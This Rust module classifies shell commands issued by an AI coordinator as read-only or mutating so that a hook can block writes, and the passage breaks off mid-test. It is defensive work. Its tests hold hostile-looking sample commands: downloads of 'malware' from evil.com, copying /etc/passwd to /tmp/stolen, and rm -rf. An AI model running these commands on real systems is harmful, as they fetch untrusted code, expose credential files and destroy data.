//! Bash command audit — classifies commands as read-only or potentially mutating.
//!
//! Used by the coordinator to log warnings when the model attempts write
//! operations, and by the `apiari validate-bash` PreToolUse hook to block them.

/// Classification result for a Bash command.
#[derive(Debug, Clone, PartialEq, Eq)]
pub enum BashClassification {
    /// Command is read-only (safe).
    ReadOnly,
    /// Command may modify files or state.
    PotentiallyMutating {
        /// The pattern that matched.
        matched_pattern: String,
    },
}

impl BashClassification {
    /// Returns `true` if the command is potentially mutating.
    pub fn is_mutating(&self) -> bool {
        matches!(self, BashClassification::PotentiallyMutating { .. })
    }
}

/// Patterns that indicate a command may modify files or state.
const WRITE_PATTERNS: &[&str] = &[
    "sed -i",
    "mv ",
    "cp ",
    "rm ",
    "mkdir ",
    "touch ",
    "chmod ",
    "chown ",
    "wget ",
    "cargo install",
    "npm install",
    "pip install",
    "gh pr merge",
];

/// Git subcommands that mutate state.
const GIT_MUTATING: &[&str] = &[
    "git add",
    "git commit",
    "git push",
    "git tag",
    "git merge",
    "git rebase",
    "git reset",
    "git checkout -b",
    "git branch -d",
    "git branch -D",
    "git stash",
    "git cherry-pick",
    "git clone",
    "git init",
];

/// Commands that require dev-mode to run (blocked by default).
const DEVMODE_ONLY: &[&str] = &["gh repo create"];

/// Classify a Bash command, taking dev-mode into account.
///
/// When dev-mode is active, additional commands are allowed:
/// `gh repo create`, `git clone`, `git init`, `mkdir`, and general file writes.
pub fn classify_bash_command_with_devmode(command: &str) -> BashClassification {
    let result = classify_bash_command(command);
    if result.is_mutating()
        && super::devmode::is_active()
        && let BashClassification::PotentiallyMutating {
            ref matched_pattern,
        } = result
    {
        // Patterns unlocked in dev-mode: file creation, repo setup, writes
        let devmode_unlocked = [
            "mkdir ",
            "touch ",
            "cp ",
            "mv ",
            "output redirect",
            "tee",
            "curl download",
            "git clone",
            "git init",
            "gh repo create",
        ];
        if devmode_unlocked.iter().any(|p| matched_pattern == p) {
            return BashClassification::ReadOnly;
        }
    }
    result
}

/// Classify a Bash command as read-only or potentially mutating.
///
/// Commands that only target `/tmp/` are considered read-only (the coordinator
/// needs to write prompt files there for `swarm --prompt-file`).
/// `apiari config set` is also allowed — it's a safe, targeted config write.
pub fn classify_bash_command(command: &str) -> BashClassification {
    let trimmed = command.trim();

    // Allow `apiari config set` — safe targeted config write.
    if is_apiari_config_command(trimmed) {
        return BashClassification::ReadOnly;
    }

    // Shell passthrough commands (bash -c, sh -c, ...) execute arbitrary code
    // inside their quoted argument — always classify as mutating.
    if is_shell_passthrough(trimmed) {
        return BashClassification::PotentiallyMutating {
            matched_pattern: "shell passthrough".to_string(),
        };
    }

    // Strip heredoc bodies and quoted string contents so their text doesn't
    // trigger pattern matches or false-positive redirect detection.
    let stripped = strip_heredoc_bodies(trimmed);
    let stripped = strip_quoted_strings(&stripped);
    let check = stripped.as_str();

    // Check each pattern
    for &pattern in WRITE_PATTERNS {
        if contains_pattern(check, pattern) && !all_targets_allowed(check, pattern) {
            return BashClassification::PotentiallyMutating {
                matched_pattern: pattern.to_string(),
            };
        }
    }

    // Git mutating commands — but allow tag creation and tag-only pushes.
    for &pattern in GIT_MUTATING {
        if contains_pattern(check, pattern) {
            if is_allowed_git_tag_operation(check, pattern) {
                continue;
            }
            return BashClassification::PotentiallyMutating {
                matched_pattern: pattern.to_string(),
            };
        }
    }

    // Output redirects: > and >> (but not 2> which is stderr)
    // Check for echo/cat/printf writing to files
    if has_file_redirect(check) && !redirect_targets_allowed(check) {
        return BashClassification::PotentiallyMutating {
            matched_pattern: "output redirect".to_string(),
        };
    }

    // tee (writes to files)
    if contains_pattern(check, "tee ") && !all_targets_allowed(check, "tee ") {
        return BashClassification::PotentiallyMutating {
            matched_pattern: "tee".to_string(),
        };
    }

    // curl -o / -O / --output (downloads to file)
    if (contains_pattern(check, "curl ") || contains_pattern(check, "curl\t"))
        && has_curl_output_flag(check)
        && !curl_output_targets_allowed(check)
    {
        return BashClassification::PotentiallyMutating {
            matched_pattern: "curl download".to_string(),
        };
    }

    // Dev-mode-only commands (blocked by default, allowed in dev-mode)
    for &pattern in DEVMODE_ONLY {
        if contains_pattern(check, pattern) {
            return BashClassification::PotentiallyMutating {
                matched_pattern: pattern.to_string(),
            };
        }
    }

    BashClassification::ReadOnly
}

/// Check if a command is an `apiari config` invocation.
///
/// Allows `apiari config set ...` (and chained variants with `&&`).
fn is_apiari_config_command(command: &str) -> bool {
    // Check each part of a chained command (&&, ;)
    for sep in &[" && ", "; "] {
        if command.contains(sep) {
            return command
                .split(sep)
                .all(|part| is_single_apiari_config(part.trim()));
        }
    }
    is_single_apiari_config(command)
}

/// Check if a single (non-chained) command is `apiari config ...`.
fn is_single_apiari_config(command: &str) -> bool {
    let cmd = command.trim();
    cmd.starts_with("apiari config ")
        || cmd.starts_with("apiari config\t")
        || cmd == "apiari config"
}

/// Strip heredoc bodies from a command string.
///
/// Removes everything between a heredoc marker (`<< 'DELIM'`, `<< "DELIM"`,
/// or `<< DELIM`) and the matching closing `DELIM` line, replacing the body
/// with a placeholder so the outer command structure is preserved.
fn strip_heredoc_bodies(command: &str) -> String {
    let mut result = String::with_capacity(command.len());
    let lines: Vec<&str> = command.lines().collect();
    let mut i = 0;

    while i < lines.len() {
        let line = lines[i];
        // Look for heredoc start: << optionally followed by - then delimiter
        if let Some(delim) = extract_heredoc_delimiter(line) {
            // Keep the first line (the command with <<) but replace the marker
            // body with nothing — just emit the command line itself.
            result.push_str(line);
            result.push('\n');
            i += 1;
            // Skip lines until we find the closing delimiter
            while i < lines.len() {
                if lines[i].trim() == delim {
                    i += 1;
                    break;
                }
                i += 1;
            }
        } else {
            result.push_str(line);
            if i + 1 < lines.len() {
                result.push('\n');
            }
            i += 1;
        }
    }

    result
}

/// Returns true if the command is a shell passthrough (e.g. `bash -c "..."`,
/// `sh -c "..."`). These commands must NOT have their quoted strings stripped
/// because the quoted content is the actual command to audit.
fn is_shell_passthrough(command: &str) -> bool {
    /// Characters that can appear immediately before a shell token and still
    /// count as a word boundary: whitespace, path separators, and shell
    /// chaining / grouping operators (including backtick for command
    /// substitution).
    fn is_boundary_before(b: u8) -> bool {
        b.is_ascii_whitespace() || matches!(b, b'/' | b';' | b'&' | b'|' | b'(' | b'`')
    }

    let shells = ["bash", "sh", "zsh", "fish"];
    for shell in shells {
        // Iterate over *all* occurrences so a substring false-positive
        // (e.g. "--squash") doesn't shadow a real match later in the string.
        let mut start = 0;
        while let Some(rel) = command[start..].find(shell) {
            let pos = start + rel;
            start = pos + 1; // advance for next iteration

            // Char before must be a boundary or start of string
            if pos > 0 && !is_boundary_before(command.as_bytes()[pos - 1]) {
                continue;
            }
            // Char after must be whitespace or end of string
            let end = pos + shell.len();
            if end < command.len() && !command.as_bytes()[end].is_ascii_whitespace() {
                continue;
            }
            let after = command[end..].trim_start();
            if after.starts_with("-c") || after.starts_with("--") {
                return true;
            }
        }
    }
    false
}

/// Replace the contents of quoted strings (single and double) with empty
/// strings, preserving the quotes themselves so the outer command structure
/// stays intact. This prevents patterns inside string literals (e.g. date
/// comparisons in `python3 -c` or `jq` filters) from triggering false
/// positives in WRITE_PATTERNS or redirect detection.
fn strip_quoted_strings(command: &str) -> String {
    let mut result = String::with_capacity(command.len());
    let mut chars = command.chars().peekable();

    while let Some(c) = chars.next() {
        if c == '\'' || c == '"' {
            result.push(c);
            // Consume everything until matching close quote
            let quote = c;
            let mut found_close = false;
            while let Some(inner) = chars.next() {
                if inner == '\\' && quote == '"' {
                    // In double-quoted strings, skip escaped characters
                    chars.next();
                    continue;
                }
                if inner == quote {
                    result.push(quote);
                    found_close = true;
                    break;
                }
                // Drop the character (strip the content)
            }
            if !found_close {
                // Unterminated quote — close it to keep structure valid
                result.push(quote);
            }
        } else {
            result.push(c);
        }
    }

    result
}

/// Extract the heredoc delimiter from a line containing `<<`.
///
/// Handles `<< 'DELIM'`, `<< "DELIM"`, `<<-DELIM`, and `<< DELIM`.
/// Returns `None` if no heredoc marker is found.
fn extract_heredoc_delimiter(line: &str) -> Option<&str> {
    let idx = line.find("<<")?;
    let after = &line[idx + 2..];
    // Skip optional `-` (for <<- which strips leading tabs)
    let after = after.strip_prefix('-').unwrap_or(after);
    let after = after.trim_start();
    if after.is_empty() {
        return None;
    }
    // Strip quotes: 'DELIM' or "DELIM"
    if (after.starts_with('\'') && after[1..].contains('\''))
        || (after.starts_with('"') && after[1..].contains('"'))
    {
        let quote = after.as_bytes()[0];
        let end = after[1..].find(quote as char)? + 1;
        Some(&after[1..end])
    } else {
        // Unquoted: take until whitespace or end
        Some(after.split_whitespace().next().unwrap_or(after))
    }
}

/// Check if a matched git command is an allowed tag operation.
///
/// Allowed operations:
/// - `git tag v*` — creating version tags
/// - `git push origin v*` — pushing a version tag to origin
/// - `git push origin refs/tags/v*` — alternate ref form
/// - `git pull` / `git fetch` — read-only networking (not in GIT_MUTATING, but
///   listed here for completeness)
///
/// General `git push` (no args, or pushing branches) remains blocked.
fn is_allowed_git_tag_operation(command: &str, matched_pattern: &str) -> bool {
    // Split on all chain operators so every part is checked individually.
    let parts = split_chain_operators(command);
    for part in &parts {
        let part = part.trim();
        // If this part doesn't match the pattern, it's fine (handled elsewhere).
        if !part.starts_with(matched_pattern) {
            continue;
        }
        if !is_single_allowed_git_tag_op(part) {
            return false;
        }
    }
    true
}

/// Split a command string on all chain operators (`&&`, `;`).
fn split_chain_operators(command: &str) -> Vec<&str> {
    let mut parts = vec![command];
    for sep in &[" && ", "; "] {
        parts = parts.iter().flat_map(|p| p.split(sep)).collect();
    }
    parts
}

/// Check a single (non-chained) command for allowed git tag operations.
fn is_single_allowed_git_tag_op(command: &str) -> bool {
    let trimmed = command.trim();

    // `git tag v*` — creating a version tag
    if let Some(rest) = trimmed.strip_prefix("git tag ") {
        let tag_name = rest.split_whitespace().next().unwrap_or("");
        return tag_name.starts_with('v');
    }

    // `git push origin v*` or `git push origin refs/tags/v*`
    if let Some(rest) = trimmed.strip_prefix("git push ") {
        let args: Vec<&str> = rest.split_whitespace().collect();
        if args.len() == 2 && args[0] == "origin" {
            let target = args[1];
            // Reject refspecs with `:` — they can update arbitrary refs.
            if target.contains(':') {
                return false;
            }
            return target.starts_with('v') || target.starts_with("refs/tags/v");
        }
        return false;
    }

    false
}

/// Check if a command contains a pattern, respecting word boundaries at the start.
fn contains_pattern(command: &str, pattern: &str) -> bool {
    // Check if command starts with pattern
    if command.starts_with(pattern) {
        return true;
    }
    // Check after pipe, semicolon, &&, ||, or subshell
    for sep in &[" | ", "; ", " && ", " || ", "$(", "`"] {
        for part in command.split(sep) {
            let part = part.trim();
            if part.starts_with(pattern) {
                return true;
            }
        }
    }
    false
}

/// Check if a path is an allowed write target.
///
/// Allowed targets:
/// - `/tmp/` — the coordinator needs this for swarm `--prompt-file`.
/// - Claude Code project memory paths (`~/.claude/.../memory/`) — the
///   coordinator is allowed to update its own persistent memory.
/// - `~/.config/apiari/` — workspace config files managed by the coordinator.
/// - `.apiari/` (workspace root) — coordinator-owned config files
///   (`context.md`, `skills/*.md`). Both relative `.apiari/` paths and
///   absolute paths resolving under `{cwd}/.apiari/` are accepted.
fn is_allowed_write_target(path: &str) -> bool {
    if path.starts_with("/tmp/") || path == "/tmp" {
        return true;
    }
    // Claude Code project memory files.
    // Matches: ~/.claude/.../memory/..., /Users/.../.claude/.../memory/..., $HOME/.claude/.../memory/...
    let has_claude = path.contains("/.claude/")
        || path.starts_with("~/.claude/")
        || path.contains("$HOME/.claude/");
    if has_claude && (path.contains("/memory/") || path.ends_with("/memory")) {
        return true;
    }
    // Workspace .apiari/ directory — coordinator-owned config files.
    // Relative paths like `.apiari/context.md` are resolved against CWD (= workspace root).
    // Block path traversal (no `..` allowed).
    if is_apiari_dir_target(path) {
        return true;
    }
    // Apiari config directory.
    // Only allow home-dir-anchored paths: ~/..., /Users/*/..., /home/*/..., $HOME/...
    let is_home_anchored = path.starts_with("~/")
        || path.starts_with("/Users/")
        || path.starts_with("/home/")
        || path.starts_with("$HOME/");
    let in_apiari_config = path.contains("/.config/apiari/") || path.ends_with("/.config/apiari");
    // Block writes to the devmode state file (prevent privilege escalation).
    if path.ends_with("/.devmode") {
        return false;
    }
    (is_home_anchored && in_apiari_config) || path == "~/.config/apiari"
}

/// Check if a path targets the workspace `.apiari/` directory.
///
/// Accepts:
/// - Relative: `.apiari/...` (relative to CWD = workspace root)
/// - Absolute: `/.../something/.apiari/...` (must contain `/.apiari/` segment)
///
/// Rejects paths containing `..` to prevent traversal attacks.
fn is_apiari_dir_target(path: &str) -> bool {
    if path.contains("..") {
        return false;
    }
    // Relative path: .apiari/ or .apiari
    if path == ".apiari" || path.starts_with(".apiari/") {
        return true;
    }
    // Absolute path containing /.apiari/ segment
    path.contains("/.apiari/") || path.ends_with("/.apiari")
}

/// Check if the destination/target of a write command is an allowed path.
///
/// For commands like `cp`, `mv`, `tee`, the last non-flag argument is the destination.
/// For others we check if any argument points to an allowed path.
fn all_targets_allowed(command: &str, pattern: &str) -> bool {
    // Find the subcommand portion that matched
    let relevant = find_relevant_part(command, pattern);
    let parts: Vec<&str> = relevant.split_whitespace().collect();
    let non_flag_args: Vec<&str> = parts[1..]
        .iter()
        .filter(|p| !p.starts_with('-'))
        .copied()
        .collect();

    if non_flag_args.is_empty() {
        return false;
    }

    // For cp/mv: destination is the last argument
    if pattern.starts_with("cp ") || pattern.starts_with("mv ") {
        if let Some(dest) = non_flag_args.last() {
            return is_allowed_write_target(dest);
        }
        return false;
    }

    // For tee/touch/mkdir/chmod/etc: all targets must be allowed
    non_flag_args.iter().all(|p| is_allowed_write_target(p))
}

/// Find the relevant subcommand in a pipeline that matches the pattern.
fn find_relevant_part<'a>(command: &'a str, pattern: &str) -> &'a str {
    for sep in &[" | ", "; ", " && ", " || "] {
        for part in command.split(sep) {
            let part = part.trim();
            if part.starts_with(pattern) {
                return part;
            }
        }
    }
    command
}

/// Check for output redirects (> or >>) that aren't stderr (2>).
fn has_file_redirect(command: &str) -> bool {
    let bytes = command.as_bytes();
    for (i, &b) in bytes.iter().enumerate() {
        if b == b'>' {
            // Skip if part of 2> (stderr redirect)
            if i > 0 && bytes[i - 1] == b'2' {
                continue;
            }
            // Skip if part of >> (already caught by first >)
            // This is a redirect
            return true;
        }
    }
    false
}

/// Check if redirect targets are allowed write paths.
fn redirect_targets_allowed(command: &str) -> bool {
    // Python open() writing to /tmp/ counts as a tmp-targeted write
    if command.contains("open('/tmp/") || command.contains("open(\"/tmp/") {
        return true;
    }
    // Find the part after > or >>
    if let Some(idx) = command.find('>') {
        let after = &command[idx..];
        // Skip > or >>
        let after = after.trim_start_matches('>').trim();
        is_allowed_write_target(after)
    } else {
        false
    }
}

/// Check if curl has -o, -O, or --output flags.
fn has_curl_output_flag(command: &str) -> bool {
    let parts: Vec<&str> = command.split_whitespace().collect();
    parts
        .iter()
        .any(|p| *p == "-o" || *p == "-O" || *p == "--output" || p.starts_with("-o"))
}

/// Check if curl output target is an allowed write path.
fn curl_output_targets_allowed(command: &str) -> bool {
    let parts: Vec<&str> = command.split_whitespace().collect();
    for (i, part) in parts.iter().enumerate() {
        if (*part == "-o" || *part == "--output") && i + 1 < parts.len() {
            return is_allowed_write_target(parts[i + 1]);
        }
    }
    false
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_safe_read_commands() {
        let safe = [
            "ls -la",
            "git log --oneline",
            "git status",
            "git diff HEAD",
            "gh pr view 42",
            "gh pr list",
            "cat src/main.rs",
            "head -20 README.md",
            "grep -r 'pattern' src/",
            "find . -name '*.rs'",
            "wc -l src/main.rs",
            "sqlite3 db.sqlite 'SELECT * FROM signals'",
            "curl https://api.example.com/status",
            "swarm --dir /home/user/project status",
        ];
        for cmd in &safe {
            let result = classify_bash_command(cmd);
            assert_eq!(
                result,
                BashClassification::ReadOnly,
                "expected ReadOnly for: {cmd}"
            );
        }
    }

    #[test]
    fn test_mutating_file_commands() {
        let mutating = [
            ("rm -rf build/", "rm "),
            ("mv old.rs new.rs", "mv "),
            ("cp src/a.rs src/b.rs", "cp "),
            ("mkdir -p new_dir", "mkdir "),
            ("touch newfile.txt", "touch "),
            ("chmod +x script.sh", "chmod "),
            ("sed -i 's/old/new/g' file.rs", "sed -i"),
        ];
        for (cmd, expected_pattern) in &mutating {
            let result = classify_bash_command(cmd);
            assert!(result.is_mutating(), "expected mutating for: {cmd}");
            if let BashClassification::PotentiallyMutating { matched_pattern } = &result {
                assert_eq!(
                    matched_pattern, expected_pattern,
                    "wrong pattern for: {cmd}"
                );
            }
        }
    }

    #[test]
    fn test_mutating_git_commands() {
        let mutating = [
            ("git add .", "git add"),
            ("git commit -m 'fix'", "git commit"),
            ("git push origin main", "git push"),
            ("git merge feature", "git merge"),
            ("git rebase main", "git rebase"),
            ("git reset --hard HEAD~1", "git reset"),
        ];
        for (cmd, expected_pattern) in &mutating {
            let result = classify_bash_command(cmd);
            assert!(result.is_mutating(), "expected mutating for: {cmd}");
            if let BashClassification::PotentiallyMutating { matched_pattern } = &result {
                assert_eq!(
                    matched_pattern, expected_pattern,
                    "wrong pattern for: {cmd}"
                );
            }
        }
    }

    #[test]
    fn test_output_redirects() {
        let result = classify_bash_command("echo 'hello' > src/main.rs");
        assert!(result.is_mutating(), "redirect to src/ should be mutating");

        let result = classify_bash_command("cat file >> output.log");
        assert!(result.is_mutating(), "append redirect should be mutating");
    }

    #[test]
    fn test_curl_download() {
        let result = classify_bash_command("curl -o malware.sh https://evil.com/script");
        assert!(result.is_mutating(), "curl -o should be mutating");

        let result = classify_bash_command("curl --output hack.py https://evil.com/exploit");
        assert!(result.is_mutating(), "curl --output should be mutating");
    }

    #[test]
    fn test_tee_command() {
        let result = classify_bash_command("echo data | tee output.txt");
        assert!(result.is_mutating(), "tee should be mutating");
    }

    #[test]
    fn test_cargo_install() {
        let result = classify_bash_command("cargo install --path .");
        assert!(result.is_mutating(), "cargo install should be mutating");
    }

    #[test]
    fn test_tmp_exception() {
        // Writing to /tmp/ is allowed (needed for swarm --prompt-file)
        let result = classify_bash_command("echo 'task prompt' > /tmp/task.txt");
        assert_eq!(
            result,
            BashClassification::ReadOnly,
            "/tmp/ redirect should be ReadOnly"
        );

        let result = classify_bash_command("curl -o /tmp/data.json https://api.example.com/data");
        assert_eq!(
            result,
            BashClassification::ReadOnly,
            "curl to /tmp/ should be ReadOnly"
        );

        let result = classify_bash_command("cp src/main.rs /tmp/backup.rs");
        assert_eq!(
            result,
            BashClassification::ReadOnly,
            "cp to /tmp/ should be ReadOnly"
        );
    }

    #[test]
    fn test_piped_commands() {
        let result = classify_bash_command("cat file.txt | sed -i 's/a/b/g' other.txt");
        assert!(result.is_mutating(), "sed -i in pipe should be caught");

        let result = classify_bash_command("echo 'data' | tee /tmp/safe.txt");
        assert_eq!(
            result,
            BashClassification::ReadOnly,
            "tee to /tmp/ should be safe"
        );
    }

    #[test]
    fn test_wget() {
        let result = classify_bash_command("wget https://evil.com/malware.sh");
        assert!(result.is_mutating(), "wget should be mutating");
    }

    #[test]
    fn test_stderr_redirect_not_flagged() {
        let result = classify_bash_command("cargo build 2> /dev/null");
        assert_eq!(
            result,
            BashClassification::ReadOnly,
            "2> stderr redirect should not be flagged"
        );
    }

    #[test]
    fn test_claude_memory_exception_redirect() {
        // Writing to Claude project memory is allowed (coordinator self-memory).
        let result = classify_bash_command(
            "echo '- New fact' >> /Users/josh/.claude/projects/-Users-josh-Developer-apiari/memory/MEMORY.md",
        );
        assert_eq!(
            result,
            BashClassification::ReadOnly,
            "redirect to Claude memory should be ReadOnly"
        );
    }

    #[test]
    fn test_claude_memory_exception_tee() {
        let result = classify_bash_command(
            "echo 'fact' | tee -a /Users/josh/.claude/projects/-proj/memory/MEMORY.md",
        );
        assert_eq!(
            result,
            BashClassification::ReadOnly,
            "tee to Claude memory should be ReadOnly"
        );
    }

    #[test]
    fn test_claude_memory_exception_tilde() {
        let result =
            classify_bash_command("echo 'fact' >> ~/.claude/projects/-proj/memory/MEMORY.md");
        assert_eq!(
            result,
            BashClassification::ReadOnly,
            "redirect to ~/.claude memory should be ReadOnly"
        );
    }

    #[test]
    fn test_claude_memory_exception_mkdir() {
        let result = classify_bash_command("mkdir -p /Users/josh/.claude/projects/-proj/memory");
        assert_eq!(
            result,
            BashClassification::ReadOnly,
            "mkdir for Claude memory dir should be ReadOnly"
        );
    }

    #[test]
    fn test_non_memory_claude_path_still_blocked() {
        // Writing to other .claude paths (not /memory/) should still be blocked.
        let result =
            classify_bash_command("echo 'bad' >> /Users/josh/.claude/projects/-proj/settings.json");
        assert!(
            result.is_mutating(),
            "writing to non-memory .claude path should be mutating"
        );
    }

    #[test]
    fn test_heredoc_to_tmp_with_blocked_keyword_in_body() {
        // Heredoc writing to /tmp/ whose body mentions "cargo install" should
        // NOT be flagged — the body text is not a real command.
        let cmd = "cat > /tmp/task.txt << 'EOF'\nRun cargo install --path . to set up.\nEOF";
        let result = classify_bash_command(cmd);
        assert_eq!(
            result,
            BashClassification::ReadOnly,
            "heredoc to /tmp/ with blocked keyword in body should be ReadOnly"
        );
    }

    #[test]
    fn test_heredoc_to_non_tmp_still_blocked() {
        // Heredoc writing to a non-tmp path should still be flagged.
        let cmd = "cat > /home/user/file.txt << 'EOF'\nhello\nEOF";
        let result = classify_bash_command(cmd);
        assert!(
            result.is_mutating(),
            "heredoc to non-tmp path should be mutating"
        );
    }

    #[test]
    fn test_python_open_tmp_is_readonly() {
        // python3 -c with open('/tmp/...') should be ReadOnly even though
        // the script body may contain '>' characters.
        let cmd = r#"python3 -c "
import json
data = {'key': 'value'}
if len(data) > 0:
    with open('/tmp/out.json', 'w') as f:
        json.dump(data, f)
""#;
        let result = classify_bash_command(cmd);
        assert_eq!(
            result,
            BashClassification::ReadOnly,
            "python3 writing to /tmp/ via open() should be ReadOnly"
        );
    }

    #[test]
    fn test_redirect_to_non_tmp_still_blocked() {
        // Redirect to a non-tmp path should still be blocked.
        let cmd = "python3 -c 'print(\"hello\")' > /home/user/output.txt";
        let result = classify_bash_command(cmd);
        assert!(
            result.is_mutating(),
            "redirect to non-tmp path should be mutating"
        );
    }

    #[test]
    fn test_heredoc_with_git_mutating_in_body() {
        // Heredoc body mentioning "git push" should not trigger git-mutating check.
        let cmd =
            "cat > /tmp/instructions.md << 'EOF'\nRemember to git push after committing.\nEOF";
        let result = classify_bash_command(cmd);
        assert_eq!(
            result,
            BashClassification::ReadOnly,
            "heredoc to /tmp/ with git push in body should be ReadOnly"
        );
    }

    #[test]
    fn test_strip_heredoc_bodies() {
        let input = "cat > /tmp/f.txt << 'MARKER'\ncargo install bad\ngit push evil\nMARKER";
        let stripped = strip_heredoc_bodies(input);
        assert!(
            !stripped.contains("cargo install"),
            "heredoc body should be stripped"
        );
        assert!(
            !stripped.contains("git push"),
            "heredoc body should be stripped"
        );
        assert!(
            stripped.contains("cat > /tmp/f.txt"),
            "command line should be preserved"
        );
    }

    #[test]
    fn test_strip_quoted_strings() {
        // Double-quoted string with redirect-like content
        let input = r#"python3 -c "if x > 0: print('yes')""#;
        let stripped = strip_quoted_strings(input);
        assert!(
            !stripped.contains("> 0"),
            "quoted string content should be stripped"
        );
        assert!(
            stripped.contains("python3 -c"),
            "command structure should be preserved"
        );
    }

    #[test]
    fn test_strip_quoted_strings_single() {
        let input = "jq '.data[] | select(.count > 5)' file.json";
        let stripped = strip_quoted_strings(input);
        assert!(
            !stripped.contains("> 5"),
            "single-quoted content should be stripped"
        );
        assert!(stripped.contains("jq"), "command should be preserved");
    }

    #[test]
    fn test_strip_quoted_strings_escaped() {
        let input = r#"echo "hello \"world\" > /tmp/x""#;
        let stripped = strip_quoted_strings(input);
        assert!(
            !stripped.contains("> /tmp/x"),
            "escaped-quote string content should be stripped"
        );
    }

    #[test]
    fn test_quoted_date_comparison_not_blocked() {
        let result = classify_bash_command(
            r#"python3 -c "from datetime import datetime; print(datetime.now() > datetime(2024,1,1))""#,
        );
        assert_eq!(
            result,
            BashClassification::ReadOnly,
            "date comparison inside quoted string should not trigger redirect detection"
        );
    }

    #[test]
    fn test_quoted_jq_filter_not_blocked() {
        let result = classify_bash_command("jq '.results[] | select(.score > 90)' /tmp/data.json");
        assert_eq!(
            result,
            BashClassification::ReadOnly,
            "jq filter with > inside single quotes should not trigger redirect detection"
        );
    }

    #[test]
    fn test_shell_passthrough_not_stripped() {
        // bash -c with dangerous content must still be blocked
        let result = classify_bash_command(r#"bash -c "rm -rf /important""#);
        assert!(
            result.is_mutating(),
            "bash -c with rm -rf should still be blocked"
        );
    }

    #[test]
    fn test_sh_passthrough_not_stripped() {
        let result = classify_bash_command(r#"sh -c "cp /etc/passwd /tmp/stolen""#);
        assert!(
            result.is_mutating(),
            "sh -c with cp should still be blocked"
        );
    }

    #[test]
    fn test_apiari_config_set_allowed() {
        let result =
            classify_bash_command("apiari config set telegram.bot_token \"8139996548:AAG\"");
        assert_eq!(
            result,
            BashClassification::ReadOnly,
            "apiari config set should be allowed"
        );
    }

    #[test]
    fn test_apiari_config_set_integer_allowed() {
        let result = classify_bash_command("apiari config set telegram.chat_id -1003861140305");
        assert_eq!(
            result,
            BashClassification::ReadOnly,
            "apiari config set with integer should be allowed"
        );
    }

    #[test]
    fn test_apiari_config_set_chained_allowed() {
        let result = classify_bash_command(
            "apiari config set telegram.bot_token \"tok\" && apiari config set telegram.chat_id -123",
        );
        assert_eq!(
            result,
            BashClassification::ReadOnly,
            "chained apiari config set commands should be allowed"
        );
    }

    #[test]
    fn test_apiari_config_set_with_workspace_flag() {
        let result = classify_bash_command(
            "apiari config set --workspace myproject telegram.bot_token \"tok\"",
        );
        assert_eq!(
            result,
            BashClassification::ReadOnly,
            "apiari config set with --workspace should be allowed"
        );
    }

    #[test]
    fn test_non_apiari_config_still_blocked() {
        // Chaining apiari config with a mutating command should still be blocked
        let result =
            classify_bash_command("apiari config set telegram.bot_token tok && rm -rf /important");
        assert!(
            result.is_mutating(),
            "chain with non-config command should be blocked"
        );
    }

    #[test]
    fn test_apiari_config_dir_cp_allowed() {
        let result = classify_bash_command(
            "cp /tmp/apiari-new.toml ~/.config/apiari/workspaces/apiari.toml",
        );
        assert_eq!(
            result,
            BashClassification::ReadOnly,
            "cp to ~/.config/apiari/ should be ReadOnly"
        );
    }

    #[test]
    fn test_apiari_config_dir_absolute_path_allowed() {
        let result = classify_bash_command(
            "cp /tmp/apiari-new.toml /Users/josh/.config/apiari/workspaces/apiari.toml",
        );
        assert_eq!(
            result,
            BashClassification::ReadOnly,
            "cp to absolute .config/apiari/ should be ReadOnly"
        );
    }

    #[test]
    fn test_apiari_config_dir_home_var_allowed() {
        let result = classify_bash_command(
            "cp /tmp/apiari-new.toml $HOME/.config/apiari/workspaces/apiari.toml",
        );
        assert_eq!(
            result,
            BashClassification::ReadOnly,
            "cp to $HOME/.config/apiari/ should be ReadOnly"
        );
    }

    #[test]
    fn test_apiari_config_dir_mkdir_allowed() {
        let result = classify_bash_command("mkdir -p ~/.config/apiari/workspaces");
        assert_eq!(
            result,
            BashClassification::ReadOnly,
            "mkdir for apiari config dir should be ReadOnly"
        );
    }

    #[test]
    fn test_apiari_config_dir_redirect_allowed() {
        let result =
            classify_bash_command("echo '[workspace]' > ~/.config/apiari/workspaces/test.toml");
        assert_eq!(
            result,
            BashClassification::ReadOnly,
            "redirect to ~/.config/apiari/ should be ReadOnly"
        );
    }

    #[test]
    fn test_apiari_config_dir_tee_allowed() {
        let result = classify_bash_command(
            "echo '[watchers]' | tee ~/.config/apiari/workspaces/apiari.toml",
        );
        assert_eq!(
            result,
            BashClassification::ReadOnly,
            "tee to ~/.config/apiari/workspaces/ should be ReadOnly"
        );
    }

    #[test]
    fn test_apiari_config_dir_append_redirect_allowed() {
        let result = classify_bash_command(
            "echo 'interval_secs = 120' >> ~/.config/apiari/workspaces/apiari.toml",
        );
        assert_eq!(
            result,
            BashClassification::ReadOnly,
            "append redirect to ~/.config/apiari/workspaces/ should be ReadOnly"
        );
    }

    #[test]
    fn test_non_apiari_config_dir_still_blocked() {
        let result = classify_bash_command("cp /tmp/evil.txt ~/.config/other/file.txt");
        assert!(
            result.is_mutating(),
            "writing to non-apiari config dir should be mutating"
        );
    }

    // -- Dev-mode aware classification tests --
    //
    // These tests use APIARI_DEVMODE_PATH to isolate the devmode file per test,
    // serialized via a shared mutex + RAII guard from the devmode module.

    /// Helper: run a closure with devmode on or off, using a temp file.
    fn with_devmode<F: FnOnce()>(enabled: bool, f: F) {
        let _guard = super::super::devmode::setup_test_env();
        if enabled {
            super::super::devmode::enable().unwrap();
        }
        f();
    }

    #[test]
    fn test_devmode_on_allows_gh_repo_create() {
        with_devmode(true, || {
            let result = classify_bash_command_with_devmode("gh repo create my-repo --public");
            assert_eq!(
                result,
                BashClassification::ReadOnly,
                "gh repo create should be allowed in dev-mode"
            );
        });
    }

    #[test]
    fn test_devmode_on_allows_git_clone() {
        with_devmode(true, || {
            let result =
                classify_bash_command_with_devmode("git clone https://github.com/example/repo.git");
            assert_eq!(
                result,
                BashClassification::ReadOnly,
                "git clone should be allowed in dev-mode"
            );
        });
    }

    #[test]
    fn test_devmode_on_allows_git_init() {
        with_devmode(true, || {
            let result = classify_bash_command_with_devmode("git init");
            assert_eq!(
                result,
                BashClassification::ReadOnly,
                "git init should be allowed in dev-mode"
            );
        });
    }

    #[test]
    fn test_devmode_on_allows_mkdir() {
        with_devmode(true, || {
            let result = classify_bash_command_with_devmode("mkdir -p new-project/src");
            assert_eq!(
                result,
                BashClassification::ReadOnly,
                "mkdir should be allowed in dev-mode"
            );
        });
    }

    #[test]
    fn test_devmode_on_allows_file_redirect() {
        with_devmode(true, || {
